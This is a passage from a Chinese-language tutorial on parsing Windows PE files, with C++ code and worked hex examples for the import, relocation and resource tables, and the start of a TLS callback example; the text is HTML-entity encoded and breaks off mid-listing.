判断是不是PE文件\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;这是一个PE文件&quot;);\n\t\tAnalyzeImportTabel(buf,true);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;这不是一个PE文件&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeImportTabel(char* lpImage,bool bAnalyzeInt)\n&#123;\n\t&#x2F;&#x2F;1 获取到导入表的结构\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\t&#x2F;&#x2F;1 获取到导入表的数据目录结构\n\tPIMAGE_DATA_DIRECTORY dwImportDir &#x3D; &amp;pNt-&gt;OptionalHeader.DataDirectory[1];\n\t&#x2F;&#x2F;1 导入表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用\n\tDWORD dwImportFOA &#x3D; RvaToFoa(lpImage, dwImportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;1 已经得到了FOA，直接就能够找到导出表的结构\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTable &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(lpImage + dwImportFOA);\n\t\n\t&#x2F;&#x2F;2 开始解析\n\twhile (pImportTable-&gt;Name!&#x3D;0)\n\t&#123;\n\t\t&#x2F;&#x2F;2.1 先解析DLL的名字\n\t\t DWORD dwNameFoa &#x3D;  RvaToFoa(lpImage,pImportTable-&gt;Name);\n\t\t char* pDllName &#x3D; (char*)(dwNameFoa + lpImage);\n\t\t printf(&quot;DllName:%s\\n&quot;, pDllName);\n\n\t\t &#x2F;&#x2F;2.2 解析函数名字，选择用什么去解析\n\t\t PIMAGE_THUNK_DATA32 pNameTable &#x3D; NULL;\n\t\tif (bAnalyzeInt &#x3D;&#x3D; true)\n\t\t&#123;\n\t\t\tDWORD Foa  &#x3D; RvaToFoa(lpImage, pImportTable-&gt;OriginalFirstThunk);\n\t\t\tpNameTable &#x3D; (PIMAGE_THUNK_DATA32)(lpImage + Foa);\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\tDWORD Foa &#x3D; RvaToFoa(lpImage, pImportTable-&gt;FirstThunk);\n\t\t\tpNameTable &#x3D; (PIMAGE_THUNK_DATA32)(lpImage + Foa);\n\t\t&#125;\n\t\t&#x2F;&#x2F;2.3 开始解析名字\n\t\twhile (pNameTable-&gt;u1.Ordinal!&#x3D;0)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;2.3.1 判断最高位是不是1\n\t\t\tif (IMAGE_SNAP_BY_ORDINAL32(pNameTable-&gt;u1.Ordinal)&#x3D;&#x3D;1)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;只有序号\n\t\t\t\tprintf(&quot;  序号:%x,名称:NULL\\n&quot;, pNameTable-&gt;u1.Ordinal&amp;0x7FFFFFFF);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;既有名字，又有序号\n\t\t\t\tDWORD dwNameFoa &#x3D; RvaToFoa(lpImage, pNameTable-&gt;u1.AddressOfData);\n\t\t\t\tPIMAGE_IMPORT_BY_NAME pName  &#x3D; (PIMAGE_IMPORT_BY_NAME)(dwNameFoa + lpImage);\n\t\t\t\tprintf(&quot;  序号:%x,名称:%s\\n&quot;, pName-&gt;Hint,pName-&gt;Name);\n\t\t\t&#125;\n\t\t\tpNameTable++;\n\t\t&#125;\n\t\tprintf(&quot;----------------------------\\n&quot;);\n\t\tpImportTable++;\n\t&#125;\n&#125;\n\n重定位表什么叫做重定位一般情况下，exe的默认加载基址是0x0040 0000\n会有一些代码，是这样的：\nlea eax, ds:[0x0040 1100]\npush eax\ncall printf\n但是目前来看，几乎都不会加载到默认基址上。\n比如说，exe加载到0x0050 0000上，那么以上的代码还对么？？\n不对了，怎么才能对呢？？\nlea eax, ds:[0x0050 1100]\npush eax\ncall printf\n这样就对了。\n由于一个模块加载到什么位置，几乎是不确定的，所以每次程序运行，都需要将使用了VA的地方进行一次修改。这个修改的过程就称之为重定位。\n有一个区域就记录着，程序中的哪些位置使用了VA。这个区域就叫做重定位表。\n为什么模块不加载到默认基址上？？\n\n对于dll来说，他默认基址上经常已经被别的模块使用了。\n对于exe来说，每次都加载到默认基址，是一个危险的行为。数据和代码的地址每次都是固定的，就很危险。对于exe来说，就有一个随机基址的功能，使得每次运行，基址都不一样。\n\n手工解析重定位typedef struct _IMAGE_BASE_RELOCATION &#123;\n    DWORD   VirtualAddress;\t&#x2F;&#x2F; (1) 需重定位数据的起始RVA\n    DWORD   SizeOfBlock;\t&#x2F;&#x2F; (2) 本结构与TypeOffset总大小\n&#x2F;&#x2F;  WORD    TypeOffset[1];\t&#x2F;&#x2F; (3) 原则上不属于本结构\n&#125; IMAGE_BASE_RELOCATION;\ntypedef  IMAGE_BASE_RELOCATION UNALIGNED IMAGE_BASE_RELOCATION;\n\n\n\nVirtualAddress:0A9000 ——-&gt;FOA:76E00\nsize:3ACC\n\n\nVirtualAddress:031000\nSizeofBlock:30\n\n\n\n数据\n偏移\n重定位位置\nFOA\n要重定位的数据\n\n\n\n3A7F\nA7F\n031000+A7F\n2E7F\n004A4840\n\n\n3A85\nA85\n031000+A85\n2E85\n0048FC88\n\n\n3A92\nA92\n031000+A92\n2E92\n004A4844\n\n\n咱们再OD中，去看RVA是031000+A7F的地址，发现确实是被重定位过的了。\n\n\n怎么重定位的呢？？\n原始VA - 默认基址 &#x3D; 新VA - 新基址\n验证：\n0x00D6 0000 - 0x0040 0000 + 004A4840 得到就是0xE04840\n测试代码#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\hugan\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeReloc(char* lpImage);\nint main()\n&#123;\n\tsetlocale(LC_ALL, &quot;chs&quot;);\n\t&#x2F;&#x2F;1 打开文件\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 获取文件大小\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 申请空间并初始化\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 读取文件\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 判断是不是PE文件\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;这是一个PE文件&quot;);\n\t\tAnalyzeReloc(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;这不是一个PE文件&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\nstruct TYPEOFFSET &#123;\n\tWORD OFFSET : 12;\n\tWORD TYPE : 4;\n&#125;;\nvoid AnalyzeReloc(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1. 找到重定位的结构体\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;1. 得到了重定位的数据目录\n\tPIMAGE_DATA_DIRECTORY pRelocDir &#x3D; &amp;pOption-&gt;DataDirectory[5];\n\n\t&#x2F;&#x2F;2. 得到重定位表\n\tPIMAGE_BASE_RELOCATION pReloc &#x3D; \n\t\t(PIMAGE_BASE_RELOCATION)\n\t(RvaToFoa(lpImage, pRelocDir-&gt;VirtualAddress)+ lpImage);\n\t&#x2F;&#x2F;3. 开始解析重定位\n\twhile (pReloc-&gt;SizeOfBlock!&#x3D;0)\n\t&#123;\n\t\t&#x2F;&#x2F;得到描述每一个位置偏移的数组\n\t\tTYPEOFFSET* typeoffset &#x3D; (TYPEOFFSET*)(pReloc + 1);\n\t\tDWORD dwCount &#x3D; (pReloc-&gt;SizeOfBlock - 8) &#x2F; 2;\n\t\tDWORD dwBeginRva &#x3D;  pReloc-&gt;VirtualAddress;\n\t\tprintf(&quot;----------------------------------\\n&quot;);\n\t\tfor (int i &#x3D; 0; i &lt; dwCount; i++)\n\t\t&#123;\n\t\t\tif (typeoffset[i].TYPE&#x3D;&#x3D;3)\n\t\t\t&#123;\n\t\t\t\tDWORD dwRelocRva &#x3D; (dwBeginRva + typeoffset[i].OFFSET);\n\t\t\t\tprintf(&quot;要重定位的位置RVA：%p\\n&quot;, dwRelocRva);\n\t\t\t\tPDWORD pRelocData &#x3D; (PDWORD)(RvaToFoa(lpImage, dwRelocRva) + lpImage);\n\t\t\t\tprintf(&quot;要重定位的数据：%p\\n&quot;, *pRelocData);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;类型是%d&quot;, typeoffset[i].TYPE);\n\t\t\t&#125;\n\n\t\t&#125;\n\t\tprintf(&quot;----------------------------------\\n&quot;);\n\t\t&#x2F;&#x2F;找到下一个0x1000字节重定位信息\n\t\tpReloc &#x3D; (PIMAGE_BASE_RELOCATION)((char*)pReloc + pReloc-&gt;SizeOfBlock);\n\t&#125;\n\n&#125;\n\n资源表菜单，对话框，图标，光标，位图，工具栏…..他们称之为资源,资源就是PE文件在运行的时候需要使用到的一些通用数据。编译的时候，将他们独立保存在一个区域中。\n记录这些区域的一个结构，就是资源表了。\n理解资源表当咱们通过数据目录表找到资源表的时候，这个资源表分成了3层结构：\n第一层：一共有多少种资源\n第二层：这种资源有多少个\n第三层：这个资源的位置\n手工解析PE文件找到资源表找到资源表的数据目录：\nRVA:1AF000———–&gt; FOA:1A5400\nSIZE:153058\n分析第一层\n\nNumberOfNamedEntries：0x2\nNumberOfIdEntries：0xC\n代表着后面有14个下面的结构体：\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY &#123;\n    union &#123;\n        struct &#123;\n            DWORD NameOffset   :31;\t&#x2F;&#x2F; (1) 资源名偏移\n            DWORD NameIsString:1;\t&#x2F;&#x2F; (2) 资源名为字符串\n        &#125;;\n        DWORD   Name;\t\t&#x2F;&#x2F; (3) 资源&#x2F;语言类型\n        WORD    Id;\t\t&#x2F;&#x2F; (4) 资源数字ID\n    &#125;;\n    union &#123;\n        DWORD   OffsetToData;\t&#x2F;&#x2F; (5) 数据偏移地址\n        struct &#123;\n            DWORD   OffsetToDirectory:31;&#x2F;&#x2F; (6) 子目录偏移地址\n            DWORD   DataIsDirectory   :1;&#x2F;&#x2F; (7) 数据为目录\n        &#125;;\n    &#125;;\n&#125;IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;\n\n第一个资源的信息：\nId：0x80008CC8 最高位是1，所以是以字符串为标识所以NameOffset：8CC8 这是一个相对于资源表起始位置的偏移\n他不是RVA\n 1A5400+8CC8 &#x3D; 1AE0C8\n\n\nOffsetToData：0x80 00 00 80 最高位为1，所以下一层是目录\nOffsetToDirectory：80 这是一个相对于资源表起始位置的偏移\n 他不是RVA\n1A5400+80 &#x3D; 1A5480\n这个就是第二层的位置\n\nId：0x800095E0\nNameOffset：95E0\n1A5400+95E0 &#x3D; 1AE9E0\n\n\nOffsetToData：0x80001890\nOffsetToDirectory：1890\n1A5400+1890 &#x3D; 1A6C90\n这个就是第三层的位置了\n\nOffsetToData：5F20\n 1A5400+5E20 &#x3D;1AB220\n和LordPE种解析出来的是一样的\n\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\SouLinker\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n&#x2F;&#x2F; 判断是不是PE文件\n#include &lt;map&gt;\nusing std::map;\n\nmap&lt;int, const char*&gt; g_mapResourceInfo;\nmap&lt;const char*, const char*&gt; abc;\nvoid InitResourceInfo()\n&#123;\n\tg_mapResourceInfo[0x1] &#x3D; &quot;Cursor&quot;;\n\tg_mapResourceInfo[0x2] &#x3D; &quot;BitMap&quot;;\n\tg_mapResourceInfo[0x3] &#x3D; &quot;Icon&quot;;\n\tg_mapResourceInfo[0x4] &#x3D; &quot;Menu&quot;;\n\tg_mapResourceInfo[0x5] &#x3D; &quot;Dialog&quot;;\n\tg_mapResourceInfo[0x6] &#x3D; &quot;String Table&quot;;\n\tg_mapResourceInfo[0x7] &#x3D; &quot;Font Directory&quot;;\n\tg_mapResourceInfo[0x8] &#x3D; &quot;Font&quot;;\n\tg_mapResourceInfo[0x9] &#x3D; &quot;Accelerators&quot;;\n\tg_mapResourceInfo[0xA] &#x3D; &quot;UnFormatted&quot;;\n\tg_mapResourceInfo[0xB] &#x3D; &quot;Message Table&quot;;\n\tg_mapResourceInfo[0xC] &#x3D; &quot;Group Cursor&quot;;\n\tg_mapResourceInfo[0xE] &#x3D; &quot;Group Icon&quot;;\n\tg_mapResourceInfo[0x10] &#x3D; &quot;Version Information&quot;;\n&#125;\n\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeResource(char* lpImage);\nint main()\n&#123;\n\tsetlocale(LC_ALL, &quot;chs&quot;);\n\tInitResourceInfo();\n\t&#x2F;&#x2F;1 打开文件\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 获取文件大小\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 申请空间并初始化\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 读取文件\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 判断是不是PE文件\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;这是一个PE文件&quot;);\n\t\tAnalyzeResource(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;这不是一个PE文件&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeResource(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1. 找到资源表的结构体\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;1. 得到了资源表的数据目录\n\tPIMAGE_DATA_DIRECTORY pResourceDir&#x3D; &amp;pOption-&gt;DataDirectory[2];\n\n\t&#x2F;&#x2F;2. 得到资源表第一层的位置\n\tDWORD dwResourceFOA &#x3D;  RvaToFoa(lpImage, pResourceDir-&gt;VirtualAddress);\n\tPIMAGE_RESOURCE_DIRECTORY pFirstDir &#x3D;(PIMAGE_RESOURCE_DIRECTORY)(dwResourceFOA + lpImage);\n\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstRes &#x3D; (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pFirstDir + 1);\n\t&#x2F;&#x2F;3. 解析资源表\n\tDWORD dwFirstCount &#x3D; pFirstDir-&gt;NumberOfIdEntries + pFirstDir-&gt;NumberOfNamedEntries;\n\t&#x2F;&#x2F;3.1 解析第一层\n\tfor (int i &#x3D; 0; i &lt; dwFirstCount; i++)\n\t&#123;\n\t\t&#x2F;&#x2F;解析第一层的名称信息\n\t\tif (pFirstRes[i].NameIsString &#x3D;&#x3D; TRUE)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;以字符串作为标识\n\t\t\tPIMAGE_RESOURCE_DIR_STRING_U pNameInfo &#x3D; \n\t\t\t(PIMAGE_RESOURCE_DIR_STRING_U)(pFirstRes[i].NameOffset + (DWORD)pFirstDir);\n\t\t\tWCHAR* pName &#x3D; new WCHAR[pNameInfo-&gt;Length + 1]&#123;0&#125;;\n\t\t\t&#x2F;&#x2F;wcscpy_s(pName, pNameInfo-&gt;Length, pNameInfo-&gt;NameString);\n\t\t\tfor (int m &#x3D; 0; m &lt; pNameInfo-&gt;Length; m++)\n\t\t\t&#123;\n\t\t\t\tpName[m] &#x3D; pNameInfo-&gt;NameString[m];\n\t\t\t&#125;\n\t\t\twprintf(L&quot;资源种类标识:%s\\n&quot;, pName);\n\t\t&#125;\n\t\t&#x2F;&#x2F;以数字作为标识\n\t\telse\n\t\t&#123;\n\t\t\tif (g_mapResourceInfo.count(pFirstRes[i].Id) &#x3D;&#x3D; 1)\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;资源种类标识%s\\n&quot;, g_mapResourceInfo[pFirstRes[i].Id]);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;资源种类标识%d\\n&quot;, pFirstRes[i].Id);\n\t\t\t&#125;\n\t\t\n\t\t&#125;\n\t\t&#x2F;&#x2F;解析第一层的位置信息，从而得到第二层\n\t\t\t\n\t\tif (pFirstRes[i].DataIsDirectory &#x3D;&#x3D; 1)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;根据偏移得到第二层的位置,以及数组\n\t\t\tPIMAGE_RESOURCE_DIRECTORY pSecondDir &#x3D;\n\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY)(pFirstRes[i].OffsetToDirectory + (DWORD)pFirstDir);\n\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondRes &#x3D;\n\t\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY(pSecondDir + 1);\n\t\t\t\n\t\t\t\n\t\t\t&#x2F;&#x2F;第二层的资源个数\n\t\t\tDWORD dwSecondCount  &#x3D; \n\t\t\tpSecondDir-&gt;NumberOfIdEntries + pSecondDir-&gt;NumberOfNamedEntries;\n\t\t\tfor (int j &#x3D; 0; j &lt; dwSecondCount; j++)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;解析第二层的名称信息\n\t\t\t\tif (pSecondRes[j].NameIsString &#x3D;&#x3D; TRUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;以字符串作为标识\n\t\t\t\t\tPIMAGE_RESOURCE_DIR_STRING_U pNameInfo &#x3D;\n\t\t\t\t\t\t(PIMAGE_RESOURCE_DIR_STRING_U)(pSecondRes[j].NameOffset + (DWORD)pFirstDir);\n\t\t\t\t\tWCHAR* pName &#x3D; new WCHAR[pNameInfo-&gt;Length + 1]&#123; 0 &#125;;\n\t\t\t\t\t&#x2F;&#x2F;wcscpy_s(pName, pNameInfo-&gt;Length + 1, pNameInfo-&gt;NameString);\n\t\t\t\t\tfor (int m &#x3D; 0; m &lt; pNameInfo-&gt;Length; m++)\n\t\t\t\t\t&#123;\n\t\t\t\t\t\tpName[m] &#x3D; pNameInfo-&gt;NameString[m];\n\t\t\t\t\t&#125;\n\t\t\t\t\twprintf(L&quot;   资源标识:%s\\n&quot;, pName);\n\t\t\t\t&#125;\n\t\t\t\telse\n\t\t\t\t&#123;\n\t\t\t\t\twprintf(L&quot;   资源标识:%d\\n&quot;, pSecondRes[j].Id);\n\t\t\t\t&#125;\n\t\t\t\t&#x2F;&#x2F;解析第二层的位置信息\n\t\t\t\tif (pSecondRes[j].DataIsDirectory &#x3D;&#x3D; TRUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;根据偏移得到第三层的位置,以及数组\n\t\t\t\t\tPIMAGE_RESOURCE_DIRECTORY pThirdDir &#x3D;\n\t\t\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY)\n\t\t\t\t\t\t(pSecondRes[j].OffsetToDirectory+ (DWORD)pFirstDir);\n\t\t\t\t\tPIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdRes &#x3D;\n\t\t\t\t\t(PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pThirdDir + 1);\n\n\t\t\t\t\t&#x2F;&#x2F;解析第三层，但是不需要循环了\n\t\t\t\t\tPIMAGE_RESOURCE_DATA_ENTRY pData &#x3D; \n\t\t\t\t\t(PIMAGE_RESOURCE_DATA_ENTRY)(pThirdRes-&gt;OffsetToData + (DWORD)pFirstDir);\n\t\t\t\t\t&#x2F;&#x2F;pData-&gt;OffsetToData 资源起始位置的RVA\n\t\t\t\t\t&#x2F;&#x2F;pData-&gt;Size  资源的大小\n\t\t\t\t\tprintf(&quot;            资源的起始RVA：%x  资源的大小：%x\\n&quot;, pData-&gt;OffsetToData, pData-&gt;Size);\n\t\t\t\t\t&#x2F;&#x2F;获取到资源的数据了，输出10个字节，用于对比\n\t\t\t\t\tunsigned char* pRes &#x3D; (unsigned char *)\n\t\t\t\t\t\t(RvaToFoa(lpImage, pData-&gt;OffsetToData) + lpImage);\n\t\t\t\t\tprintf(&quot;            &quot;);\n\t\t\t\t\tfor (size_t m&#x3D; 0; m &lt; 10; m++)\n\t\t\t\t\t&#123;\n\t\t\t\t\t\tprintf(&quot;%x  &quot;, pRes[m]);\n\t\t\t\t\t&#125;\n\t\t\t\t\tprintf(&quot;\\n&quot;);\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\n\nTLS表简介线程局部存储：可以将TLS全局变量，在每一个线程中都创建一份，从而解决一定的线程同步问题。\n测试代码C++\n&#x2F;&#x2F; 03_TLS.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#pragma comment(linker, &quot;&#x2F;INCLUDE:__tls_used&quot;)\nint g_nNum1 &#x3D; 100;\n_declspec(thread) int g_nNum2 &#x3D; 200;&#x2F;&#x2F;TLS的全局变量\n\n&#x2F;&#x2F; TLS回调函数A\nvoid NTAPI t_TlsCallBack_A(PVOID DllHandle, DWORD Reason, PVOID Red) &#123;\n\tif (DLL_PROCESS_ATTACH &#x3D;&#x3D; Reason)\n\t&#123;\n\t\tprintf(&quot;i am a  mimidaima!\\r\\n&quot;);\n\t&#125;\n\tif (DLL_THREAD_DETACH &#x3D;&#x3D; Reason) &#x2F;&#x2F; 如果线程退出则打印信息\n\t\tprintf(&quot;t_TlsCallBack_A -&gt; ThreadDetach!\\r\\n&quot;);\n\treturn;\n&#125;\n&#x2F;&#x2F; TLS回调函数B\nvoid NTAPI t_TlsCallBack_B(PVOID DllHandle, DWORD Reason, PVOID Red) &#123;\n\tif (DLL_THREAD_DETACH &#x3D;&#x3D; Reason) &#x2F;&#x2F; 如果线程退出则打印信息\n\t\tprintf(&quot;t_TlsCallBack_B -&gt; 